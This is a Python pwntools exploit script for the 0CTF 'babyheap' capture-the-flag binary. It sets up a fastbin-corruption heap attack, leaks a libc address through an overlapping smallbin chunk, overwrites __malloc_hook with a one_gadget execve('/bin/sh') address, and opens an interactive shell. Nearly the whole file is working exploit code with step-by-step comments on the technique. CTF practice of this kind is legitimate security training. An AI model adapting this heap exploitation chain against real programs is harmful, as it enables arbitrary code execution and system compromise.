from pwn import *
import sys 

context(terminal=['terminator', '-e'])
context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./0ctfbabyheap.dms', env={"LD_PRELOAD":"./libc.so.6"})
	gdb.attach(p, "b main")
elif sys.argv[1] == "live":
	p = process('./0ctfbabyheap.dms', env={"LD_PRELOAD":"./libc.so.6"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def allocate(size):
	log.info("Allocating Size: " + str(size))
	p.sendline('1')
	p.sendlineafter(': ', str(size))
	p.recvuntil(': ', timeout=1)

def free(idx):
	log.info("Freeing: " + str(idx))
	p.sendline('3')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': ')

def dump(idx):
	log.info("Dumping: " + str(idx))
	p.sendline('4')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': \n')
	data = p.recvline()
	p.recvuntil(': ')
	return data

def fill(idx, data):
	log.info("Filling: " + str(idx))
	p.sendline('2')
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(len(data)))
	p.sendafter(': ', data)
	p.recvuntil(': ')

def interact():
	log.success("Popping Shell")
	p.interactive()

def exploit():

	log.success("Sending Exploit...")

	p.recvuntil(": ")

	log.info("Setting up the heap...")

	allocate(0x20) # fast bin
	chunk0 = "0" * 32
	fill(0,chunk0)
	allocate(0x20) # fast bin
	chunk1 = "1" * 32
	fill(1, chunk1)
	allocate(0x20) # fast bin
	chunk2 = "2" * 32
	fill(2, chunk2)
	allocate(0x20) # fast bin
	chunk3 = "3" * 32
	fill(3, chunk3)
	allocate(0x80) # smallbin # using a smallbin to leak helps to prevent heap consolidation. This allows you to prevent heap consolidation and trick malloc into thinking it is a fastbin to return an arbitrary pointer. Smallbin allows contains a BK to the main_arena when it is the head of the freelist and this address will fit inside the fastbin chunk where we can read from that chunk using the application
	chunk4 = "4" * 32
	fill(4,chunk4)

	free(1) # free fast bin
	free(2) # free fast bin # this is now the top of the fastbin free list

	log.info("Performing partial overwrite on fastbin chunk...")

	payload  = p64(0x41)*5
	payload += p64(0x31)
	payload += p64(0x42)*5
	payload += p64(0x31)
	payload += p8(0xc0)
	fill(0, payload) # partial overwrite of fastbin->FD with \xc0 (location of smallbin) (overlapping chunks)

	log.info("Corrupting smallbin size to turn into fastbin...")

	payload  = p64(0x43)*5
	payload += p64(0x31) # corrupting smallbin->size to pass allocation assert # chunk 4
	fill(3, payload)

	log.info("Allocating on top of corrupted FD...")

	allocate(0x20) # allocting on the top free list (last freed)
	allocate(0x20) # allocating on the corrupted pointer of FD

	log.info("Restoring smallbin size...")

	payload  = p64(0x44)*5
	payload += p64(0x91) # restoring chunk size back to 0x91 # chunk 4
	fill(3, payload)

	log.info("Preventing heap consolidation...")

	allocate(0x100) # prevent consolidation

	log.info("Populating FD & BK of chunk...")

	free(4) # populate fd and bk of chunk 4

	offset = 0x3c4b78 # offset to libc
	execve_offset = 0x4526a # one shot execv(/bin/sh) gadget
	malloc_hook_offset = 0x3C4AED # offset to location in __malloc_hook

	libcBase = u64(dump(2)[:8]) - offset # pointer to overlapped chunk
	leak = u64(dump(2)[:8])
	malloc_hook = libcBase + malloc_hook_offset
	execve = libcBase + execve_offset
	log.success("leak: " + hex(leak))
	log.success("libc: " + hex(libcBase))
	log.success("__malloc_hook: " + hex(malloc_hook))
	log.success("execve: " + hex(execve))

	log.info("Creating fake chunk...")

	allocate(0x68) # fake chunk

	log.info("Adding fake chunk to free list")

	free(4) # places fake chunk on top of free list 

	log.info("Corrupting fake chunk FD to point to __malloc_hook()")

	fill(2, p64(malloc_hook)) # overwrite fake chunk # malloc_hook

	log.info("Trigger __malloc_hook()")

	allocate(0x60) # go to location in malloc_hook

	log.info("Return pointer to location in __malloc_hook()")

	allocate(0x60) # return our target pointer (malloc_hook)

	log.info("Overwriting __malloc_hook() location with one_gadget")

	payload  = '\x00'*3
	payload += p64(0)*2
	payload += p64(execve) # overwrite pointer
	fill(6, payload)

	log.info("Triggering execve(/bin/sh)")

	allocate(1337) # triggers malloc and call system

	interact() # interactive shell

exploit()